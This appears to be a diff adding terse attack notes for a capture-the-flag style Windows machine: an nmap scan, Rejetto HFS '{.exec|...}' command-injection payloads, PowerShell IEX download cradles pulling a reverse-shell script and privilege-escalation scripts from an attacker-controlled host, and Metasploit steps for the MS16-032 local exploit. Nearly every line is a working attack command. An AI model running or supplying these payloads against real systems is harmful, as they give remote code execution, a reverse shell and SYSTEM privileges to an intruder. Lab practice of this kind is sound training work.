@@ -1,0 +1,34 @@
+nmap -sV -sC 10.129.54.228 -Pn > nmap.txt
+
+
+%00{.exec|ping 192.168.119.134}
+
+{.exec|powershell.exe IEX(New-Object Net.Webclient).downloadstring('http://10.10.14.26:8000/Invoke-PowerShellTcp.ps1').}
+{.exec|C:\windows\SysNative\windowsPowershell\v1.0\powershell.exe IEX(New-Object Net.Webclient).downloadstring('http://10.10.14.26:8000/Invoke-PowerShellTcp.ps1').}
+
+{.exec|C:\windows\SysNative\windowsPowershell\v1.0\powershell.exe ping 10.10.14.26.}
+
+
+systeminfo
+
+IEX(New-Object Net.Webclient).downloadstring('http://10.10.14.26:8000/Sherlock.ps1')
+IEX(New-Object Net.Webclient).downloadstring('http://10.10.14.26:8000/shell_pri.ps1')
+
+
+
+IEX(New-Object Net.Webclient).downloadstring('http://10.10.14.26:8000/Invoke-MS16032.ps1')
+
+
+
+search rejetto
+
+exploit/windows/local/ms16_032_secondary_logon_handle_privesc
+set rhost
+set lhost
+migrate to 64 process
+background
+search suggest
+use post/multi/recon/local_exploit_suggester
+set session 1
+根據提示選用
+windows/local/ms16_032_secondary_logon_handle_privesc
